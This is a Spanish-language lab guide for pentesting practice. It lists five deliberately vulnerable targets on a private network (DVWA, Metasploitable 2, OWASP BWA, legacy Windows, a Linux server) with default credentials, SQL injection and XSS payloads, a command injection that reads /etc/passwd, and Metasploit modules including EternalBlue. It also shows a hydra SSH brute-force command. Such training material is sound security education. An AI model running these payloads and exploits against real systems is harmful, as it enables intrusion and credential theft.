# Targets Vulnerables - Configuraciones de Práctica

## Target 1: DVWA (Damn Vulnerable Web Application)

### Configuración
- **IP:** 192.168.56.201
- **URL:** http://192.168.56.201
- **Credenciales:** admin / password

### Vulnerabilidades para Practicar
1. **SQL Injection**
   - URL: http://192.168.56.201/vulnerabilities/sqli/
   - Payload: `' OR 1=1 --`
   - Herramienta: sqlmap

2. **Reflected XSS**
   - URL: http://192.168.56.201/vulnerabilities/xss_r/
   - Payload: `<script>alert('XSS')</script>`

3. **Stored XSS**
   - URL: http://192.168.56.201/vulnerabilities/xss_s/
   - Payload: `<script>alert('XSS')</script>`

4. **Command Injection**
   - URL: http://192.168.56.201/vulnerabilities/exec/
   - Payload: `; cat /etc/passwd`

5. **File Upload**
   - URL: http://192.168.56.201/vulnerabilities/upload/
   - Payload: PHP shell renombrado a .jpg

6. **CSRF**
   - URL: http://192.168.56.201/vulnerabilities/csrf/
   - Payload: Formulario malicioso

### Comandos de Práctica
```bash
# SQL Injection con sqlmap
sqlmap -u "http://192.168.56.201/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx" --dbs

# XSS con Burp Suite
# Intercept request y modifica parámetros

# Command Injection manual
curl "http://192.168.56.201/vulnerabilities/exec/?ip=;cat+/etc/passwd&Submit=Submit"
```

---

## Target 2: Metasploitable 2

### Configuración
- **IP:** 192.168.56.200
- **Credenciales:**
  - FTP: msfadmin / msfadmin
  - SSH: msfadmin / msfadmin
  - MySQL: root / (vacío)
  - Tomcat: tomcat / tomcat

### Servicios Expuestos
| Puerto | Servicio | Vulnerabilidad |
|--------|----------|----------------|
| 21 | FTP | vsftpd 2.3.4 backdoor |
| 22 | SSH | Fuerza bruta |
| 23 | Telnet | Credenciales débiles |
| 25 | SMTP | Open relay |
| 80 | HTTP | Múltiples web vulns |
| 139 | SMB | Null session |
| 445 | SMB | EternalBlue (si Windows) |
| 3306 | MySQL | Credenciales débiles |
| 5432 | PostgreSQL | Credenciales débiles |
| 6667 | IRC | UnrealIRCd backdoor |
| 8180 | Tomcat | Manager default creds |

### Explotaciones con Metasploit
```bash
# vsftpd Backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.200
exploit

# UnrealIRCd Backdoor
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.200
exploit

# Tomcat Manager
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.56.200
set USERNAME tomcat
set PASSWORD tomcat
exploit
```

---

## Target 3: OWASP BWA

### Configuración
- **IP:** 192.168.56.202
- **URL:** http://192.168.56.202

### Aplicaciones Incluidas
1. **Mutillidae** - Múltiples vulnerabilidades web
2. **WebGoat** - Tutorial interactivo de seguridad
3. **Juice Shop** - Modern web app vulnerabilities
4. **Node.js applications** - Server-side vulnerabilities
5. **PHP applications** - Legacy vulnerabilities

### Prácticas Recomendadas
```bash
# Escaneo con Nikto
nikto -h http://192.168.56.202

# Dirbusting
dirb http://192.168.56.202

# SQL Injection en Mutillidae
# Navegar a: http://192.168.56.202/mutillidae/
```

---

## Target 4: Windows XP/7 (Legacy)

### Configuración
- **IP:** 192.168.56.203
- **Credenciales:** Administrator / (vacío)

### Vulnerabilidades
- **MS08-067** - NetAPI (Windows XP)
- **MS17-010** - EternalBlue (Windows 7)
- **MS09-050** - SMBv2 (Windows Vista/7)

### Explotaciones con Metasploit
```bash
# MS08-067
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.56.203
exploit

# EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.203
set LHOST 192.168.56.100
exploit
```

---

## Target 5: Linux Server

### Configuración
- **IP:** 192.168.56.204
- **Credenciales:** admin / admin

### Servicios
- Apache con CGI vulnerable
- SSH con weak keys
- FTP con anonymous access
- Samba con null session

### Prácticas
```bash
# Enumeración SMB
enum4linux -a 192.168.56.204

# CGI Exploitation
nikto -h http://192.168.56.204/cgi-bin/

# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.204
```
